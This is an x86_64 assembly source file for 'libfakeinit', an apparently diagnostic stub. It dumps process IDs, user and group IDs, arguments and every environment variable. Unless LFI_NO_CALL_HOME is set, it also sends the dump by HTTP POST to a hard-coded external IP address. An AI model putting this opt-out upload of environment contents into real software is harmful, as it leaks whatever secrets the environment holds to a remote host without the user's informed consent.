; libfakeinit for x86_64 Linux & SysV ABI
; Copyright (C) 2019 Menhera.org Developers

; raw binary
; nasm main.asm

; This code must be able to run in read-only region.
; Place writable data in dynamically allocated memory.
; This code must be position independent. (PIE)


[warning +all]

BITS 64
CPU X64
DEFAULT REL


; syscalls
_SYS_READ	equ	0x0
_SYS_WRITE	equ	0x1
_SYS_MMAP	equ	0x9
_SYS_MPROTECT	equ	0xa
_SYS_GETPID	equ	0x27
_SYS_SOCKET	equ	0x29
_SYS_CONNECT	equ	0x2a
_SYS_SHUTDOWN	equ	0x30
_SYS_EXIT	equ	0x3c
_SYS_GETUID	equ	0x66
_SYS_GETGID	equ	0x68
_SYS_GETEUID	equ	0x6b
_SYS_GETEGID	equ	0x6c
_SYS_TIME	equ	0xc9

_AF_INET	equ	0x2
_SOCK_STREAM	equ	0x1
_SHUT_WR	equ	0x1
_SHUT_RDWR	equ	0x2


; entry point
; int _entry (int argc: rdi, char **argv: rsi, char **environ: rdx)
_entry:
	%push	mycontext
	%stacksize	flat64
	%assign %$localsize	0
	%local argc:qword, argv:qword, environ:qword, print_fd:qword
	push	rbp
	mov	rbp, rsp
	sub	rsp, %$localsize
	
	push	r12
	push	r13
	push	r14
	push	r15
	push	rbx
	
	; save argc, argv, environ
	mov	[argc], rdi
	mov	[argv], rsi
	mov	[environ], rdx
	
	mov	qword	[print_fd], 1
	lea	rdi, [rel _environ_name_call_home]
	mov	rsi, [environ]
	call	_env_is_set
	test	eax, -1
	jnz	_dump_end
	
	mov	si, [rel _home_port]
	mov	edi, [rel _home_addr]
	call	_tcp_connect
	cmp	rax, -1
	je	_dump_end
	mov	[print_fd], rax
	
	lea	rdi, [rel _http_request]
	mov	rsi, [print_fd]
	call	_print_str_real
_call_home_init_end:
	
	lea	rdi, [rel _environ_name_dump]
	mov	rsi, [environ]
	call	_env_is_set
	test	eax, -1
	jnz	_dump_end
	
	; print time()
	lea	rdi, [rel _time_msg]
	mov	rsi, [print_fd]
	call	_print_str
	
	xor	eax, eax
	mov	al, _SYS_TIME
	xor	edi, edi
	syscall
	mov	rdi, rax
	mov	rsi, [print_fd]
	call	_print_int
	mov	rdi, [print_fd]
	call	_print_newline
	
	; print PID
	lea	rdi, [rel _pid_msg]
	mov	rsi, [print_fd]
	call	_print_str
	
	xor	eax, eax
	mov	al, _SYS_GETPID
	syscall
	mov	rdi, rax
	mov	rsi, [print_fd]
	call	_print_int
	mov	rdi, [print_fd]
	call	_print_newline
	
	; print UID
	lea	rdi, [rel _uid_msg]
	mov	rsi, [print_fd]
	call	_print_str
	
	xor	eax, eax
	mov	al, _SYS_GETUID
	syscall
	mov	rdi, rax
	mov	rsi, [print_fd]
	call	_print_int
	mov	rdi, [print_fd]
	call	_print_newline
	
	; print EUID
	lea	rdi, [rel _euid_msg]
	mov	rsi, [print_fd]
	call	_print_str
	
	xor	eax, eax
	mov	al, _SYS_GETEUID
	syscall
	mov	rdi, rax
	mov	rsi, [print_fd]
	call	_print_int
	mov	rdi, [print_fd]
	call	_print_newline
	
	; print GID
	lea	rdi, [rel _gid_msg]
	mov	rsi, [print_fd]
	call	_print_str
	
	xor	eax, eax
	mov	al, _SYS_GETGID
	syscall
	mov	rdi, rax
	mov	rsi, [print_fd]
	call	_print_int
	mov	rdi, [print_fd]
	call	_print_newline
	
	; print EGID
	lea	rdi, [rel _egid_msg]
	mov	rsi, [print_fd]
	call	_print_str
	
	xor	eax, eax
	mov	al, _SYS_GETEGID
	syscall
	mov	rdi, rax
	mov	rsi, [print_fd]
	call	_print_int
	mov	rdi, [print_fd]
	call	_print_newline
	
	; print argc
	lea	rdi, [rel _argc_msg]
	mov	rsi, [print_fd]
	call	_print_str
	
	mov	rdi, [argc] ; argc
	mov	rsi, [print_fd]
	call	_print_int
	mov	rdi, [print_fd]
	call	_print_newline
	
	; print argv
	mov	rdi, [argv]
_argv_loop:
	test	qword	[rdi], -1
	jz	_argv_end
	
	push	rdi
	mov	rdi, [rdi]
	push	rdi
	
	lea	rdi, [rel _argv_msg]
	mov	rsi, [print_fd]
	call	_print_str
	
	pop	rdi
	mov	rsi, [print_fd]
	call	_print_str
	mov	rdi, [print_fd]
	call	_print_newline
	pop	rdi
	
	add	rdi, 8
	jmp	_argv_loop
_argv_end:
	
	; environ
	mov	rdi, [environ]
_environ_loop:
	test	qword	[rdi], -1
	jz	_environ_end
	push	rdi
	
	mov	rdi, [rdi]
	
	push	rdi
	lea	rdi, [rel _environ_msg]
	mov	rsi, [print_fd]
	call	_print_str
	pop	rdi
	
	mov	rsi, [print_fd]
	call	_print_str
	mov	rdi, [print_fd]
	call	_print_newline
	
	pop	rdi
	add	rdi, 8
	jmp	_environ_loop
_environ_end:
	
_dump_end:
	lea	rdi, [rel _environ_name_call_home]
	mov	rsi, [environ]
	call	_env_is_set
	test	eax, -1
	jnz	_call_home_fini_end
	
	mov	rdi, [print_fd]
	cmp	rdi, 1
	je	_call_home_fini_end
	
	lea	rdi, [rel _http_last_chunk]
	mov	rsi, [print_fd]
	call	_print_str_real
	
	mov	rdi, [print_fd]
	call	_socket_close
	
_call_home_fini_end:
	lea	rdi, [rel _environ_name_exit]
	mov	rsi, [environ]
	call	_env_is_set
	test	eax, -1
	jz	_return
	
	; exit (0)
	xor	edi, edi
	mov	dil, 42
	call	_exit
	
_return:
	pop	rdx
	pop	rsi
	pop	rdi
	
	
	; return 0
	xor	eax, eax
	
	pop	rbx
	pop	r15
	pop	r14
	pop	r13
	pop	r12
	
	mov	rsp, rbp
	pop	rbp
	ret
	%pop

; void _exit (int code: rdi)
_exit:
	xor	eax, eax
	mov	al, _SYS_EXIT
	syscall
_end:
	jmp	_end

; print C string to STDOUT
; int _print_str (void *buffer: rdi, int fd: rsi)
_print_str:
	mov	r8, rsi
	mov	rsi, rdi
	xor	edx, edx
_print_str_loop:
	test	byte	[rsi + rdx], -1
	jz	_print_str_end
	inc	rdx
	jmp	_print_str_loop
_print_str_end:
	push	rdx
	test	rdx, -1
	jz	_print_str_return
	
	push	rdx
	push	rsi
	push	rdi
	
	mov	rdi, rdx
	mov	rsi, r8
	call	_print_int_real
	
	lea	rdi, [rel _crlf]
	call	_print_str_real
	
	pop	rdi
	pop	rsi
	pop	rdx
	
	mov	rdi, r8
	xor	eax, eax
	mov	al, _SYS_WRITE
	syscall
	
	lea	rdi, [rel _crlf]
	mov	rsi, r8
	call	_print_str_real
	
_print_str_return:
	pop	rax ; return written bytes
	xor	edx, edx
	xor	edi, edi
	mov	rsi, r8
	ret

_print_str_real:
	mov	r8, rsi
	mov	rsi, rdi
	xor	edx, edx
_print_str_real_loop:
	test	byte	[rsi + rdx], -1
	jz	_print_str_real_end
	inc	rdx
	jmp	_print_str_real_loop
_print_str_real_end:
	push	rdx
	test	rdx, -1
	jz	_print_str_real_return
	mov	rdi, r8
	xor	eax, eax
	mov	al, _SYS_WRITE
	syscall
_print_str_real_return:
	pop	rax ; return written bytes
	xor	edx, edx
	xor	edi, edi
	mov	rsi, r8
	ret

; print 64-bit integer to STDOUT in hex-string.
; int _print_int (int n: rdi, int fd: rsi)
_print_int:
	push	rdi
	
	mov	rdi, 18
	call	_print_int_real
	lea	rdi, [rel _crlf]
	call	_print_str_real
	
	lea	rdi, [rel _hex_prefix]
	call	_print_str_real
	pop	rdi
	
	call	_print_int_real
	
	lea	rdi, [rel _crlf]
	call	_print_str_real
	
	ret

_print_int_raw:
	push	rdi
	lea	rdi, [rel _hex_prefix]
	call	_print_str_real
	pop	rdi
_print_int_real:
	mov	r9, rsi
	push	qword	0x0
	push	qword	0x0
	mov	rax, rsp
	xor	ecx, ecx
	lea	r10, [rel _hex_digits]
	xor	r8, r8
_print_int_loop:
	cmp	ecx, 16
	je	_print_int_end
	
	rol	rdi, 4
	
	mov	r8b, dil
	and	r8b, 0x0f
	mov	sil, [r10 + r8]
	mov	[rax + rcx], sil
	
	inc	ecx
	jmp	_print_int_loop
_print_int_end:
	; write 16 bytes into STDOUT
	mov	rsi, rax
	mov	rdi, r9
	xor	eax, eax
	mov	al, _SYS_WRITE
	xor	edx, edx
	mov	dl, 16
	syscall
	
	xor	eax, eax
	mov	al, 1
	pop	rdi
	pop	rdi
	xor	edi, edi
	mov	rsi, r9
	ret

; void _print_newline (int fd: rdi)
_print_newline:
	mov	rsi, rdi
	lea	rdi, [rel _newline]
	call	_print_str
	ret

; int _env_is_set (const char *env_name: rdi, const char **environ: rsi)
_env_is_set:
	xor	eax, eax
_env_is_set_loop:
	test	qword	[rsi], -1
	jz	_env_is_set_end
	push	rsi
	
	mov	rsi, [rsi]
	xor	ecx, ecx
	
	xor	ebx, ebx
_env_is_set_char_loop:
	test	byte	[rdi + rcx], -1
	jz	_env_is_set_test_value
	
	mov	dl, [rdi + rcx]
	xor	dl, [rsi + rcx]
	test	dl, -1
	jnz	_env_is_set_next
	
	inc	ecx
	jmp	_env_is_set_char_loop
	
_env_is_set_test_value:
	cmp	byte	[rsi + rcx], 61
	jne	_env_is_set_next
	
	test	byte	[rsi + rcx + 1], -1
	jz	_env_is_set_next
	
	mov	eax, 1
	pop	rsi
	ret
	
_env_is_set_next:
	pop	rsi
	add	rsi, 8
	jmp	_env_is_set_loop
_env_is_set_end:
	ret

; int _tcp_connect (uint32_t addr: edi, uint16_t port: si)
_tcp_connect:
	%push
	%stacksize	flat64
	%assign %$localsize	0
	%local zero:qword, sockaddr_in:qword, fd:qword
	push	rbp
	mov	rbp, rsp
	sub	rsp, %$localsize
	
	push	r12
	push	r13
	push	r14
	push	r15
	push	rbx
	
	mov	[sockaddr_in + 4], edi
	mov	[sockaddr_in + 2], si
	mov	word	[sockaddr_in], _AF_INET
	
	; socket()
	xor	eax, eax
	mov	al, _SYS_SOCKET
	mov	rdi, _AF_INET
	mov	rsi, _SOCK_STREAM
	xor	edx, edx
	syscall
	mov	[fd], rax
	
	; connect()
	xor	eax, eax
	mov	al, _SYS_CONNECT
	mov	rdi, [fd]
	lea	rsi, [sockaddr_in]
	xor	edx, edx
	mov	dl, 16
	syscall
	test	rax, -1
	jz	_tcp_connect_success
	
	mov	rax, -1
	jmp	_tcp_connect_end
_tcp_connect_success:
	mov	rax, [fd]
_tcp_connect_end:
	
	pop	rbx
	pop	r15
	pop	r14
	pop	r13
	pop	r12
	
	mov	rsp, rbp
	pop	rbp
	ret
	%pop

; void _socket_close (int fd: rdi)
_socket_close:
	%push
	%stacksize	flat64
	%assign %$localsize	0
	%local buf7:qword, buf6:qword, buf5:qword, buf4:qword, buf3:qword, buf2:qword, buf1:qword, buf0:qword
	
	; buf0[64]
	
	push	rbp
	mov	rbp, rsp
	sub	rsp, %$localsize
	
	push	r12
	push	r13
	push	r14
	push	r15
	push	rbx
	
	push	rdi
	; shutdown()
	xor	eax, eax
	mov	al, _SYS_SHUTDOWN
	mov	rsi, _SHUT_WR
	syscall
	pop	rdi
	
_socket_close_read:
	; read()
	push	rdi
	xor	eax, eax
	lea	rsi, [buf0]
	mov	rdx, 64
	syscall
	pop	rdi
	test	rax, -1
	jz	_socket_close_eof
	jmp	_socket_close_read
_socket_close_eof:
	
	push	rdi
	; shutdown()
	xor	eax, eax
	mov	al, _SYS_SHUTDOWN
	mov	rsi, _SHUT_RDWR
	syscall
	pop	rdi
	
	pop	rbx
	pop	r15
	pop	r14
	pop	r13
	pop	r12
	
	mov	rsp, rbp
	pop	rbp
	ret
	%pop


; read-only data below

_hex_prefix:
	db	"0x", 0x0

_hex_digits:
	db	"0123456789abcdef"

_newline:
	db	0xa, 0x0

_time_msg:
	db	"time_t: ", 0x0

_pid_msg:
	db	"PID: ", 0x0

_uid_msg:
	db	"UID: ", 0x0

_euid_msg:
	db	"EUID: ", 0x0

_gid_msg:
	db	"GID: ", 0x0

_egid_msg:
	db	"EGID: ", 0x0

_argc_msg:
	db	"argc: ", 0x0

_argv_msg:
	db	"argv[]: ", 0x0

_environ_msg:
	db	"environ[]: ", 0x0

_environ_name_dump:
	db	"LFI_NO_DUMP", 0x0

_environ_name_exit:
	db	"LFI_EXIT", 0x0

_environ_name_call_home:
	db	"LFI_NO_CALL_HOME", 0x0

_home_addr:
	db	0x96, 0x5f, 0xad, 0x51

_home_port:
	db	0x00, 0x50

_http_request:
	db	"POST /endpoint/ HTTP/1.1", 0x0d, 0x0a
	db	"Host: localhost", 0x0d, 0x0a
	db	"Connection: close", 0x0d, 0x0a
	db	"Content-Type: text/plain; charset=utf-8", 0x0d, 0x0a
	db	"Transfer-Encoding: chunked", 0x0d, 0x0a
	db	0x0d, 0x0a, 0x00

_http_last_chunk:
	db	"0", 0x0d, 0x0a, 0x0d, 0x0a, 0x00

_crlf:
	db	0x0d, 0x0a, 0x00

